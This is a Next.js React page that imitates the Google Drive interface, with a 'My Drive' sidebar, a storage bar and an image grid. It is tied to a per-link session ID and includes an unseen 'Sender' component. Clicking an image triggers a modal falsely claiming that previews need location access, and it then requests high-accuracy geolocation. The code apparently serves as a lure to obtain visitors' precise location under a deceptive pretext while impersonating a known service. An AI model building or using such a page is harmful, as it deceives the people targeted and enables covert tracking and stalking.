"use client";

import { useParams } from "next/navigation";
import Sender from "@/components/Sender";
import { useState, useRef, useEffect } from "react";

export default function GoPage() {
  const { id } = useParams() as { id: string };
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [images, setImages] = useState<string[]>(() =>
    Array.from({ length: 12 }, (_, i) =>
      `https://picsum.photos/400/300?random=${i + 1}`
    )
  );
  const [locationAllowed, setLocationAllowed] = useState<boolean | null>(null);
  const [showPermissionModal, setShowPermissionModal] = useState(false);
  const [pendingImage, setPendingImage] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Silent check on page load - this fixes the "still shows modal after allowing" bug
  useEffect(() => {
    const checkPermissionSilently = async () => {
      if (typeof navigator === "undefined" || !navigator.geolocation) {
        setLocationAllowed(false);
        return;
      }

      // Modern way: check without showing popup
      if (navigator.permissions?.query) {
        try {
          const permission = await navigator.permissions.query({
            name: "geolocation" as PermissionName,
          });

          if (permission.state === "granted") {
            setLocationAllowed(true);
            return;
          }
          if (permission.state === "denied") {
            setLocationAllowed(false);
            return;
          }
          // If "prompt" → do nothing (modal will show on first click)
        } catch (e) {
          // fallback
        }
      }

      // Fallback for older browsers - don't prompt on load
      setLocationAllowed(null);
    };

    checkPermissionSilently();
  }, []);

  const handleImageClick = (src: string) => {
    if (locationAllowed === true) {
      setSelectedImage(src);
    } else {
      setPendingImage(src);
      setShowPermissionModal(true);
    }
  };

  const requestLocationPermission = () => {
    if (typeof navigator === "undefined" || !navigator.geolocation) {
      setShowPermissionModal(false);
      setPendingImage(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      () => {
        // SUCCESS - permission granted
        setLocationAllowed(true);
        setShowPermissionModal(false);
        if (pendingImage) {
          setSelectedImage(pendingImage);
          setPendingImage(null);
        }
      },
      () => {
        // DENIED
        setLocationAllowed(false);
        setShowPermissionModal(false);
        setPendingImage(null);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  const cancelPermissionModal = () => {
    setShowPermissionModal(false);
    setPendingImage(null);
  };

  const handleUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;

    const newUrls: string[] = [];
    Array.from(files).forEach((file) => {
      if (file.type.startsWith("image/")) {
        const objectUrl = URL.createObjectURL(file);
        newUrls.push(objectUrl);
      }
    });

    setImages((prev) => [...prev, ...newUrls]);

    if (fileInputRef.current) {
      fileInputRef.current.value = "";
    }
  };

  const triggerUpload = () => {
    fileInputRef.current?.click();
  };

  if (!id) {
    return <p className="p-6 text-red-500">Invalid session ID ❌</p>;
  }

  return (
    <div className="min-h-screen bg-[#202124] flex font-sans text-[#e8eaed]">
      {/* Sidebar */}
      <aside className="hidden md:flex flex-col w-72 bg-[#202124] border-r border-[#3c4043]">
        <div className="px-4 pt-4 pb-2">
          <button
            onClick={triggerUpload}
            className="flex items-center justify-center gap-x-2 w-full bg-[#8ab4f8] hover:bg-[#aecbfa] text-[#202124] text-sm font-medium py-3 px-6 rounded-3xl shadow-md active:scale-[0.97] transition-all"
          >
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 4v16m8-8H4" />
            </svg>
            <span>New</span>
          </button>
        </div>

        {/* Navigation (unchanged) */}
        <nav className="flex-1 px-3 py-2 overflow-y-auto text-sm">
          {/* ... all your nav items (same as before) ... */}
          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl bg-[#3c4043] text-[#8ab4f8] font-medium cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="#8ab4f8" viewBox="0 0 24 24">
              <path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-2 12H6V8h12v10z"/>
            </svg>
            <span>My Drive</span>
          </div>
          {/* (rest of nav items same as your code) */}
        </nav>

        {/* Storage bar (same) */}
        <div className="px-4 py-4 border-t border-[#3c4043] mt-auto">
          <div className="flex items-center justify-between text-xs text-[#9aa0a6] mb-2">
            <span>6.8 GB of 15 GB used</span>
            <span className="text-[#8ab4f8] hover:underline cursor-pointer">Get more storage</span>
          </div>
          <div className="h-2 bg-[#3c4043] rounded-full overflow-hidden">
            <div className="h-2 w-[45%] bg-[#8ab4f8] rounded-full"></div>
          </div>
        </div>
      </aside>

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col">
        {/* Top Bar (same as before) */}
        <header className="bg-[#202124] h-14 border-b border-[#3c4043] flex items-center px-4 gap-4 shadow-sm z-10">
          {/* ... your full header code (unchanged) ... */}
        </header>

        <main className="flex-1 p-6 overflow-auto bg-[#202124]">
          {/* Mini toolbar */}
          <div className="flex items-center justify-between mb-5">
            <div className="flex items-center text-sm text-[#dadce0]">
              <span className="font-medium">My Drive</span>
              <span className="mx-2 text-[#5f6368]">•</span>
              <span className="text-[#9aa0a6]">{images.length} images</span>
            </div>

            <div className="flex items-center gap-x-1 bg-[#292a2d] rounded-3xl border border-[#3c4043] shadow-sm p-1">
              <button className="flex items-center justify-center w-9 h-9 rounded-3xl bg-[#3c4043] text-[#8ab4f8]">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4 6a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zM4 12a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zM4 18a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2z" />
                </svg>
              </button>
              <button className="flex items-center justify-center w-9 h-9 rounded-3xl hover:bg-[#3c4043] text-[#dadce0]">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.75">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h7" />
                </svg>
              </button>
            </div>
          </div>

          {/* Sender component - no wrapper div */}
          <Sender sessionId={id} />

          {/* Image Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 2xl:grid-cols-7 gap-6 mt-8">
            {images.map((src, i) => (
              <div
                key={i}
                onClick={() => handleImageClick(src)}
                className="group bg-[#292a2d] rounded-3xl overflow-hidden border border-transparent hover:border-[#5f6368] shadow-sm hover:shadow-2xl transition-all duration-300 cursor-pointer"
              >
                <div className="aspect-video bg-[#202124] relative overflow-hidden">
                  <img
                    src={src}
                    alt={`Image ${i + 1}`}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                  />
                  <div className="absolute inset-0 bg-gradient-to-b from-transparent via-transparent to-black/30 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                </div>

                <div className="px-4 py-3 flex items-center justify-between">
                  <div className="flex-1 min-w-0">
                    <p className="text-sm text-[#e8eaed] font-medium truncate">Image_{i + 1}.jpg</p>
                    <p className="text-xs text-[#9aa0a6]">Just now</p>
                  </div>
                  <button className="opacity-0 group-hover:opacity-100 p-1.5 hover:bg-[#3c4043] rounded-xl transition-colors">
                    <span className="text-xl leading-none text-[#9aa0a6]">⋯</span>
                  </button>
                </div>
              </div>
            ))}
          </div>

          {/* Floating Preview */}
          {selectedImage && (
            <div className="fixed bottom-8 right-8 w-[340px] bg-[#292a2d] rounded-3xl shadow-2xl border border-[#3c4043] overflow-hidden animate-fade-in">
              <div className="px-5 pt-5 pb-3 border-b border-[#3c4043] flex items-center justify-between">
                <div className="flex items-center gap-x-2">
                  <div className="w-6 h-6 bg-[#8ab4f8] rounded-2xl flex items-center justify-center text-[#202124] text-xs">📸</div>
                  <p className="font-medium">Preview</p>
                </div>
                <button onClick={() => setSelectedImage(null)} className="text-[#9aa0a6] hover:text-[#dadce0] text-2xl leading-none">✕</button>
              </div>
              <div className="p-5">
                <img src={selectedImage} className="w-full aspect-video object-cover rounded-2xl shadow-inner" alt="preview" />
              </div>
              <div className="px-5 py-4 border-t border-[#3c4043] bg-[#202124] flex items-center justify-between text-sm">
                <button className="flex items-center gap-x-1 text-[#8ab4f8] hover:underline">
                  <span>Download</span>
                </button>
                <button onClick={() => setSelectedImage(null)} className="px-6 py-2 bg-[#292a2d] border border-[#5f6368] rounded-3xl text-[#dadce0] hover:bg-[#3c4043] transition">
                  Close
                </button>
              </div>
            </div>
          )}

          {/* Permission Modal */}
          {showPermissionModal && (
            <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[100] px-4">
              <div className="bg-[#292a2d] rounded-3xl w-full max-w-md shadow-2xl">
                <div className="px-8 pt-8 pb-6 text-center">
                  <div className="mx-auto w-16 h-16 bg-[#3c4043] rounded-2xl flex items-center justify-center mb-6">
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-9 h-9 text-[#8ab4f8]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.25">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314-11.314z" />
                      <path strokeLinecap="round" strokeLinejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                    </svg>
                  </div>
                  <h2 className="text-2xl font-medium text-[#e8eaed] mb-3">Location permission required</h2>
                  <p className="text-[#9aa0a6] text-base leading-relaxed">
                    Full-screen image preview is only available after you allow location access.<br />
                    This is a one-time permission.
                  </p>
                </div>

                <div className="flex border-t border-[#3c4043]">
                  <button onClick={cancelPermissionModal} className="flex-1 py-6 text-[#dadce0] font-medium hover:bg-[#3c4043] rounded-bl-3xl transition-colors">
                    Cancel
                  </button>
                  <button onClick={requestLocationPermission} className="flex-1 py-6 bg-[#8ab4f8] text-[#202124] font-medium hover:bg-[#aecbfa] rounded-br-3xl transition-colors">
                    Grant Location Access
                  </button>
                </div>
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Hidden file input */}
      <input
        type="file"
        ref={fileInputRef}
        onChange={handleUpload}
        accept="image/*"
        multiple
        className="hidden"
      />

      {/* Animation */}
      <style jsx>{`
        .animate-fade-in {
          animation: fadeIn 0.25s cubic-bezier(0.16, 1, 0.3, 1);
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(12px) scale(0.95); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
      `}</style>
    </div>
  );
}